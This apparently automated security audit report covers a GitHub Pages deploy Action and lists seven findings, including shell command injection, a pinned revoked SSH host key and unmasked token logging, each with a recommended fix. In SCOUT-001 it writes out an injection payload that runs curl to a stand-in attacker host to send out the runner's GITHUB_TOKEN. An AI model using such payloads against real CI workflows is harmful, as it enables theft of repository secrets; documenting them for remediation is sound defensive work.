# Security Scout Report

**Target:** JamesIves/github-pages-deploy-action  
**Repository URL:** https://github.com/JamesIves/github-pages-deploy-action  
**Date:** 2026-05-05  
**Run Type:** initial  
**Cycle:** 1  
**Analyst:** OSS Security Scout (automated)  
**Version Analysed:** 4.8.0 (HEAD at time of scan)

---

## Executive Summary

This initial security scout cycle analysed the full TypeScript source of the
`JamesIves/github-pages-deploy-action` GitHub Action. Seven findings were
identified: two high-severity command-injection risks, one high-severity
outdated/revoked SSH host-key pin, two medium-severity weaknesses around token
masking and async error handling, one low-severity use of a non-cryptographic
PRNG, and one informational note on hook bypassing.

The most urgent issues are the command-injection vectors (SCOUT-001 and
SCOUT-002) and the pinned revoked GitHub RSA key (SCOUT-003).

---

## Findings

---

### SCOUT-001 — Command Injection via `git config user.name` / `git config user.email`

**Severity:** HIGH  
**File:** `src/git.ts`, lines 40–49  
**CWE:** CWE-78 (OS Command Injection)

#### Description

The `init()` function constructs shell command strings that embed the
user-supplied `action.name` and `action.email` values directly inside
double-quoted arguments:

```typescript
await execute(
  `git config user.name "${action.name}"`,
  action.workspace,
  action.silent
)

await execute(
  `git config user.email "${action.email}"`,
  action.workspace,
  action.silent
)
```

These values originate from the workflow inputs `git-config-name` and
`git-config-email`, or fall back to `pusher.name` / `pusher.email` from the
GitHub context payload. In workflows triggered by `pull_request` or
`pull_request_target` events, a malicious external contributor can control
the pusher payload or provide crafted input values containing shell
metacharacters.

#### Example Payload

Setting `git-config-name` to:
```
foo" && curl https://attacker.example/exfil?t=$GITHUB_TOKEN #
```
would cause the executed string to become:
```
git config user.name "foo" && curl https://attacker.example/exfil?t=$TOKEN #"
```
which runs the injected `curl` command in the same shell context.

#### Impact

Arbitrary command execution in the runner environment with access to all
environment variables, including `GITHUB_TOKEN` and any repository secrets.

#### Recommendation

Use the array-based argument API provided by `@actions/exec` instead of
interpolating values into a command string. The `execute` wrapper currently
passes `[]` as the args array and puts everything in the command string.
Refactor to separate the executable from arguments:

```typescript
import {exec} from '@actions/exec'

await exec('git', ['config', 'user.name', action.name ?? ''], {cwd, silent})
await exec('git', ['config', 'user.email', action.email ?? ''], {cwd, silent})
```

This eliminates shell interpretation entirely.

---

### SCOUT-002 — Command Injection via `commit-message`, `tag`, and `branch` Inputs

**Severity:** HIGH  
**File:** `src/git.ts`, lines 254–255, 338, 344  
**CWE:** CWE-78 (OS Command Injection)

#### Description

Three additional user-controlled values are interpolated into shell command
strings without sanitisation:

1. **`commitMessage`** — embedded into `git commit -m "${commitMessage}"`:

```typescript
await execute(
  `git commit -m "${commitMessage}" --quiet --no-verify`,
  ...
)
```

2. **`action.tag`** — embedded into `git tag ${action.tag}` and
   `git push origin ${action.tag}`:

```typescript
await execute(`git tag ${action.tag}`, ...)
await execute(`git push origin ${action.tag}`, ...)
```

3. **`action.branch`** — embedded into multiple `git push`, `git fetch`, and
   `git rebase` commands throughout `deploy()` and `generateWorktree()`.

Unlike `name` and `email`, `commitMessage` and `tag` are enclosed in either
double quotes or no quotes at all in the shell string, making injection
straightforward.

#### Impact

Same as SCOUT-001: arbitrary command execution. A workflow that sources
`commit-message` from a PR title or issue body (a common pattern) is directly
exploitable by an external contributor.

#### Recommendation

Refactor `execute()` to accept an argument array alongside the command string,
or replace the string-based wrapper with direct `exec(binary, args[])` calls
throughout. Validate/sanitise the `tag` input at the `checkParameters` stage
to reject values containing shell-special characters until the refactor is
complete.

---

### SCOUT-003 — Pinned GitHub RSA SSH Host Key is the Revoked Pre-2023 Key

**Severity:** HIGH  
**File:** `src/ssh.ts`, lines 18–19  
**CWE:** CWE-295 (Improper Certificate Validation)

#### Description

The `configureSSH()` function pins two GitHub SSH host fingerprints into
`~/.ssh/known_hosts`:

```typescript
const sshGitHubKnownHostRsa = `\n${action.hostname} ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAq2A7hRGmdnm9tUDbO9IDSwBK6TbQa+...`
const sshGitHubKnownHostDss = `\n${action.hostname} ssh-dss AAAAB3NzaC1kc3MAAACBANGFW2P9xlGU3zWrymJgI/lKo//...`
```

GitHub **revoked and replaced** its RSA host key on **24 March 2023** after
accidentally exposing it in a public repository. The key beginning with
`AAAAB3NzaC1yc2EAAAABIwAAAQEAq2A7hRGm...` is the **old, revoked key** and
was replaced with one beginning with `AAAAB3NzaC1yc2EAAAADAQABAAABgQC...`.

Additionally, the `ssh-dss` (DSA) algorithm was deprecated by OpenSSH in
version 7.0 (2015) and is disabled by default in modern OpenSSH clients.

**Consequences:**

- Any SSH-based deployment that relies solely on these pinned entries will
  either fail (if the client rejects the revoked key) or succeed only because
  the client already has the correct key from a previous step — meaning the
  pinning provides **no security value** and could silently pass an
  impersonation attack by a host presenting the revoked key.
- Pins a key that GitHub explicitly states should no longer be trusted.

#### Recommendation

Replace the hardcoded RSA fingerprint with the current GitHub RSA key
(published at https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/githubs-ssh-key-fingerprints):

```
github.com ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCj7ndNxQowgcQnjshcLrqPEiiphnt+VTTvDP6mHBL9j1aNUkY4Ue1gvwnGLVlOhGeYrnZaMgRK6+PKCUXaDbC7qtbW8gIkhL7aGCsOr/C56SJMy/BCZfxd1nWzAOxSDPgVsmerOBYfNqltV9/hWCqBywINIR+5dIg6JTJ72pcEpEjcYgXkE2YEFXV1JHnsKgbLWNlhScqb2UmyRkQyytRLtL+b/Xfwz8VEhKiSjvhBZ0RLUh4fF7FRqJH2+4jy6h0p0mQXiJj+NTn7O4VkTINdGrKkHlCuVbdZ5+n+7AznSgj50Ub6RBj5h3kBiqoxp/3ksK7ixpnWbsF/nYsV+AkBXRqTvDgHiVRaXzPl7s/WkZFuAXVdVvuE3i/o53gbkRInHs0b3NWD/rXvNVzTm0IHHG15aCimHlkqVAkpvhxUzpzWnP5e5zrg+/4E83rXpsPxcxrJkdxm/fMmFNkTr3E+aLbvM8bH+dIYQiNfCvSqMKULNVMpTkDkqolLzEumKKEnH9C+Dy+1g7bWJnFoIqbrH8lVXkQ5sJ97dX1jUHWLzWC3VCFs8V5MqeRc=
```

Remove the `ssh-dss` entry. Optionally fetch host keys dynamically via
`ssh-keyscan` or verify via SHA-256 fingerprint comparison.

---

### SCOUT-004 — GitHub Token Embedded in URL Not Masked via `core.setSecret()`

**Severity:** MEDIUM  
**File:** `src/util.ts`, lines 36–42; `src/lib.ts`  
**CWE:** CWE-532 (Information Exposure Through Log Files)

#### Description

The `generateRepositoryPath()` function embeds the deployment token inside
an HTTPS URL:

```typescript
export const generateRepositoryPath = (action: ActionInterface): string =>
  action.sshKey
    ? `git@${action.hostname}:${action.repositoryName}`
    : `https://${`x-access-token:${action.token}`}@${action.hostname}/${
        action.repositoryName
      }.git`
```

This URL (containing the token) is stored in `action.repositoryPath` and
passed to multiple `execute()` calls including `git remote add origin`,
`git push`, and `git ls-remote`. The `@actions/exec` library logs the command
before execution when `silent` is `false`.

The codebase relies on a custom `suppressSensitiveInformation()` function to
scrub the token from error message strings, but **never calls
`core.setSecret()`**, which is the GitHub Actions mechanism that ensures the
runner automatically redacts the value from all log streams regardless of
context. If `silent` is `false`, the full URL containing the token may appear
in the workflow run log.

#### Recommendation

Call `core.setSecret(action.token)` immediately after the token is obtained in
`lib.ts`, before any `execute()` calls. The `@actions/core` library will then
automatically redact the value from all subsequent log output.

```typescript
if (settings.token) {
  core.setSecret(settings.token)
}
```

---

### SCOUT-005 — Async Callbacks Inside `Array.prototype.map()` Drop Promise Rejections

**Severity:** MEDIUM  
**File:** `src/ssh.ts`, lines 41–43  
**CWE:** CWE-755 (Improper Handling of Exceptional Conditions)

#### Description

The SSH key is split into segments and loaded via `ssh-add` using an `async`
callback passed to `Array.prototype.map()`:

```typescript
action.sshKey.split(/(?=-----BEGIN)/).map(async line => {
  execSync('ssh-add -', {input: `${line.trim()}\n`})
})
```

`Array.prototype.map()` returns an array of `Promise` objects, not a single
awaitable promise. These promises are **never awaited** and any rejection
(e.g., `ssh-add` exiting non-zero for a malformed key) is silently discarded
as an unhandled promise rejection.

Additionally, `execSync` is synchronous — using it inside an async callback
provides no concurrency benefit and the `async` keyword here is misleading.

#### Consequences

- A corrupt or improperly formatted SSH key silently fails to load; the action
  may then fail with a confusing authentication error rather than a clear
  "failed to add key" message.
- Unhandled promise rejections can suppress legitimate errors and make
  debugging significantly harder.

#### Recommendation

Replace with a synchronous loop or `Promise.all`:

```typescript
for (const line of action.sshKey.split(/(?=-----BEGIN)/)) {
  execSync('ssh-add -', {input: `${line.trim()}\n`})
}
```

Or, if async behaviour is desired:

```typescript
await Promise.all(
  action.sshKey.split(/(?=-----BEGIN)/).map(async line => {
    execSync('ssh-add -', {input: `${line.trim()}\n`})
  })
)
```

---

### SCOUT-006 — `Math.random()` Used to Generate Temporary Deployment Branch Name

**Severity:** LOW  
**File:** `src/git.ts`, lines 112–114  
**CWE:** CWE-338 (Use of Cryptographically Weak PRNG)

#### Description

The temporary deployment branch name is generated using `Math.random()`:

```typescript
const temporaryDeploymentBranch = `github-pages-deploy-action-${Math.random()
  .toString(36)
  .substr(2, 9)}`
```

`Math.random()` is not a cryptographically secure pseudo-random number
generator (CSPRNG). Its output can be predicted if an attacker can observe a
sufficient number of outputs or leverage V8's known PRNG seeding mechanism.

Although the temporary branch is ephemeral and used only within a single
workflow run, a predictable name could theoretically allow a race-condition
attack in repositories with multiple concurrent deployments, where an attacker
pre-creates the branch to interfere with the push.

#### Recommendation

Replace with `crypto.randomBytes()` or Node's `crypto.randomUUID()`:

```typescript
import {randomBytes} from 'crypto'

const temporaryDeploymentBranch = `github-pages-deploy-action-${randomBytes(6).toString('hex')}`
```

---

### SCOUT-007 — `--no-verify` Unconditionally Bypasses Repository Commit Hooks

**Severity:** INFORMATIONAL  
**File:** `src/git.ts`, lines 254–255; `src/worktree.ts`, line 146  
**CWE:** N/A (Architectural / Policy concern)

#### Description

All commit operations use `--no-verify`:

```typescript
// src/git.ts
await execute(
  `git commit -m "${commitMessage}" --quiet --no-verify`,
  ...
)

// src/worktree.ts
await execute(
  `git commit --no-verify --allow-empty -m "Initial ${branchName} commit"`,
  ...
)
```

The `--no-verify` flag disables all `pre-commit` and `commit-msg` Git hooks.
For many repositories, these hooks enforce security or quality policies (e.g.,
secret scanning, linting, signing). Bypassing them unconditionally means that
deployments can push commits that violate policies without any warning.

This is often intentional in CI/CD contexts (to prevent hooks that expect an
interactive environment from blocking automation), but it is worth noting as
a conscious trade-off. Repositories that require signed commits via hooks, or
that use hooks to prevent accidental secret inclusion, lose that protection
during automated deployments.

#### Recommendation

Document this behaviour explicitly in the README. Consider adding an
opt-in `skip-verify` input (defaulting to `true` for backward compatibility)
that allows organisations to re-enable commit hook execution when desired.

---

## Summary Table

| ID         | Severity      | Title                                                       | File(s)               |
|------------|---------------|-------------------------------------------------------------|-----------------------|
| SCOUT-001  | HIGH          | Command injection via git-config-name / git-config-email   | src/git.ts:40–49      |
| SCOUT-002  | HIGH          | Command injection via commit-message, tag, branch inputs   | src/git.ts:254, 338   |
| SCOUT-003  | HIGH          | Revoked GitHub RSA SSH host key pinned in code             | src/ssh.ts:18         |
| SCOUT-004  | MEDIUM        | Token not masked with core.setSecret()                     | src/util.ts:36–42     |
| SCOUT-005  | MEDIUM        | Async map() callbacks drop SSH key loading errors          | src/ssh.ts:41–43      |
| SCOUT-006  | LOW           | Math.random() used for temporary branch name               | src/git.ts:112–114    |
| SCOUT-007  | INFORMATIONAL | --no-verify unconditionally bypasses commit hooks          | src/git.ts:254–255    |

---

## References

- GitHub SSH key rotation (March 2023): https://github.blog/2023-03-23-we-updated-our-rsa-ssh-host-key/
- GitHub SSH fingerprints: https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/githubs-ssh-key-fingerprints
- `@actions/core` setSecret API: https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret
- CWE-78 OS Command Injection: https://cwe.mitre.org/data/definitions/78.html
- CWE-295 Improper Certificate Validation: https://cwe.mitre.org/data/definitions/295.html
- CWE-338 Weak PRNG: https://cwe.mitre.org/data/definitions/338.html
- CWE-532 Information Exposure Through Log Files: https://cwe.mitre.org/data/definitions/532.html
- CWE-755 Improper Handling of Exceptional Conditions: https://cwe.mitre.org/data/definitions/755.html
